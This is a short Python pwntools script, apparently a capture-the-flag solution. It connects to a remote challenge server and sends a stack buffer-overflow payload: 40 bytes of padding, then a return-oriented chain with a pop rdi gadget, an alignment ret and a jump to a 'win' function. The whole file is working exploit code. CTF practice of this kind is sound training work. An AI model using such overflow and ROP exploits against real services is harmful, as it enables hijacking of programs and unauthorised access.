from pwn import process, remote, gdb, p64

#p = process("./pwnme")
#gdb.attach(p)

p = remote("0.cloud.chals.io", 10711)

offset = b"A"*40
pop_rdi_ret = 0x401253
ret = 0x40101a
arg = 0xdeadbeef
win_func = 0x401176

payload = [
    offset,
    p64(pop_rdi_ret),
    p64(arg),
    p64(ret), #stack alignment
    p64(win_func)
]

payload = b''.join(payload)

p.sendline(payload)

p.interactive()